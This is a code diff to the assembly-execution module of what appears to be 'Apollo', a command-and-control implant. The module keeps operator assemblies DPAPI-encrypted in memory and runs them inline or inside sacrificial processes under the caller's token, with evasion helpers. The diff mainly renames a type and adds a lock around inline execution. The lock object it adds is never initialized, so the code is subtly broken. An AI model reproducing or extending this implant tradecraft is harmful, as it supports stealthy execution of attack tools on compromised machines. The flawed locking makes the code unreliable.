@@ -35,6 +35,7 @@ using System.Reflection;
 using Apollo.Evasion;
 using static Utils.StringUtils;
 using Apollo.Utils;
+using Native;
 
 namespace Apollo.CommandModules
 {
@@ -42,9 +43,10 @@ namespace Apollo.CommandModules
     class AssemblyManager
     {
 
-        private static Dictionary<string, DarkMelkor.DPAPI_MODULE> loadedAssemblies = new Dictionary<string, DarkMelkor.DPAPI_MODULE>();
+        private static Dictionary<string, DPAPI_MODULE> loadedAssemblies = new Dictionary<string, DPAPI_MODULE>();
         private static byte[] loaderStub;
         private static Mutex assemblyMutex = new Mutex();
+        private static object inline_assembly_Locker;
         /// <summary>
         /// Execute an arbitrary C# assembly in a sacrificial process
         /// that respects the current caller's token.
@@ -134,7 +136,7 @@ namespace Apollo.CommandModules
             }
         }
 
-        private static void AddAssembly(string key, DarkMelkor.DPAPI_MODULE enc_bytes)
+        private static void AddAssembly(string key, DPAPI_MODULE enc_bytes)
         {
             lock (loadedAssemblies)
             {
@@ -145,9 +147,9 @@ namespace Apollo.CommandModules
             }
         }
 
-        private static DarkMelkor.DPAPI_MODULE GetAssembly(string key)
+        private static DPAPI_MODULE GetAssembly(string key)
         {
-            DarkMelkor.DPAPI_MODULE asm;
+            DPAPI_MODULE asm;
             lock (loadedAssemblies)
             {
                 asm = loadedAssemblies[key];
@@ -158,45 +160,49 @@ namespace Apollo.CommandModules
 #if INLINE_ASSEMBLY
         static void InlineAssembly(Job job, Agent implant)
         {
-            Task task = job.Task;
-            string commandLine = "";
-            string loaderStubID;
-            string pipeName;
-            string assemblyName;
-            string[] assemblyArguments;
-            DarkMelkor.DPAPI_MODULE assemblyBytesEnc;
-
-            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
-            assemblyName = json.Value<string>("assembly_name");
-            if (!loadedAssemblies.ContainsKey(assemblyName))
+            lock (inline_assembly_Locker)
             {
-                job.SetError(String.Format("Assembly {0} has not been loaded. Please load the assembly with the 'register_assembly' command.", assemblyName));
-                return;
-            }
-
-            assemblyArguments = SplitCommandLine(json.Value<string>("assembly_arguments"));
-            assemblyBytesEnc = GetAssembly(assemblyName);
-
-            string output = "";
-            try
-            {
-                DarkMelkor.DPAPI_MODULE oMod = DarkMelkor.dpapiDecryptModule(assemblyBytesEnc);
-                if (oMod.iModSize == 0)
+                try
                 {
-                    job.SetError(String.Format("[!] Failed to DPAPI decrypt module.."));
+                    Task task = job.Task;
+                    string commandLine = "";
+                    string loaderStubID;
+                    string pipeName;
+                    string assemblyName;
+                    string[] assemblyArguments;
+                    DPAPI_MODULE assemblyBytesEnc;
+
+                    JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
+                    assemblyName = json.Value<string>("assembly_name");
+                    if (!loadedAssemblies.ContainsKey(assemblyName))
+                    {
+                        job.SetError(String.Format("Assembly {0} has not been loaded. Please load the assembly with the 'register_assembly' command.", assemblyName));
+                        return;
+                    }
+
+                    assemblyArguments = SplitCommandLine(json.Value<string>("assembly_arguments"));
+                    assemblyBytesEnc = GetAssembly(assemblyName);
+
+                    string output = "";
+
+                    DPAPI_MODULE oMod = DarkMelkor.dpapiDecryptModule(assemblyBytesEnc);
+                    if (oMod.iModSize == 0)
+                    {
+                        job.SetError(String.Format("[!] Failed to DPAPI decrypt module.."));
+                    }
+                    output = DarkMelkor.loadAppDomainModule(assemblyArguments, oMod.bMod);
+                    DarkMelkor.freeMod(oMod);
+
+
+                    job.AddOutput(output);
+                    job.SetComplete("");
                 }
-                output = DarkMelkor.loadAppDomainModule(assemblyArguments, oMod.bMod);
-                DarkMelkor.freeMod(oMod);
+                catch (Exception ex)
+                {
 
+                    job.SetError(String.Format("Error in inline-assembly. Reason: {0}", ex.Message));
 
-                job.AddOutput(output);
-                job.SetComplete("");
-            }
-            catch (Exception ex)
-            {
-
-                job.SetError(String.Format("Error in inline-assembly. Reason: {0}", ex.Message));
-
+                }
             }
         }
 #endif
@@ -211,7 +217,7 @@ namespace Apollo.CommandModules
             string pipeName;
             string assemblyName;
             string[] assemblyArguments;
-            DarkMelkor.DPAPI_MODULE assemblyBytesEnc;
+            DPAPI_MODULE assemblyBytesEnc;
             //List<string> output = new List<string>();
             /*
              * Response from the server should be of the form:
@@ -249,7 +255,7 @@ namespace Apollo.CommandModules
 
             assemblyArguments = SplitCommandLine(json.Value<string>("assembly_arguments"));
             assemblyBytesEnc = GetAssembly(assemblyName);
-            DarkMelkor.DPAPI_MODULE oMod = DarkMelkor.dpapiDecryptModule(assemblyBytesEnc);
+            DPAPI_MODULE oMod = DarkMelkor.dpapiDecryptModule(assemblyBytesEnc);
 
 
             var startupArgs = EvasionManager.GetSacrificialProcessStartupInformation();
@@ -339,7 +345,7 @@ namespace Apollo.CommandModules
             string assemblyName;
             string[] assemblyArguments;
             int pid = -1;
-            DarkMelkor.DPAPI_MODULE assemblyBytesEnc;
+            DPAPI_MODULE assemblyBytesEnc;
             string processName = "";
 
             /*
@@ -396,7 +402,7 @@ namespace Apollo.CommandModules
 
             assemblyArguments = SplitCommandLine(json.Value<string>("assembly_arguments"));
             assemblyBytesEnc = GetAssembly(assemblyName);
-            DarkMelkor.DPAPI_MODULE oMod = DarkMelkor.dpapiDecryptModule(assemblyBytesEnc);
+            DPAPI_MODULE oMod = DarkMelkor.dpapiDecryptModule(assemblyBytesEnc);
 
             try
             {
@@ -486,7 +492,7 @@ namespace Apollo.CommandModules
                 job.SetError(String.Format("Assembly {0} (File ID: {1}) was unretrievable or of zero length.", assembly_name, file_id));
                 return;
             }
-            DarkMelkor.DPAPI_MODULE dpMod = DarkMelkor.dpapiEncryptModule(assemblyBytes, null, 0);
+            DPAPI_MODULE dpMod = DarkMelkor.dpapiEncryptModule(assemblyBytes, null, 0);
             if (dpMod.pMod != IntPtr.Zero)
             {
                 assemblyBytes = null;
